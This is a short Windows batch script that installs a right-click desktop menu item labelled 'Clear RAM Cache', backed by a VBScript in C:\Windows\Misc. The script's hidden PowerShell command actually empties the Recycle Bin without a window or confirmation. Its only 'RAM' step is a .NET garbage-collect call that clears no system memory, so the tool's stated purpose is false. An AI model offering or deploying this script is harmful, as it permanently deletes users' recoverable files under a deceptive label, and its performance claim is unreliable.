@echo Creating Silent RAM Cleaner...
echo Set WshShell = CreateObject("WScript.Shell") > "C:\Windows\Misc\ClearRAM.vbs"
echo WshShell.Run "powershell -WindowStyle Hidden -NoProfile -Command ""$ws = New-Object -ComObject Shell.Application; $ws.NameSpace('shell:::{645FF040-5081-101B-9F08-00AA002F954E}').Self.InvokeVerb('Empty'); [System.GC]::Collect()""", 0, False >> "C:\Windows\Misc\ClearRAM.vbs"
reg add "HKCR\Directory\Background\shell\ClearRAM" /ve /t REG_SZ /d "Clear RAM Cache" /f >nul 2>&1
reg add "HKCR\Directory\Background\shell\ClearRAM" /v "Icon" /t REG_SZ /d "imageres.dll,-5302" /f >nul 2>&1
reg add "HKCR\Directory\Background\shell\ClearRAM\command" /ve /t REG_SZ /d "wscript.exe \"C:\\Windows\\Misc\\ClearRAM.vbs\"" /f >nul 2>&1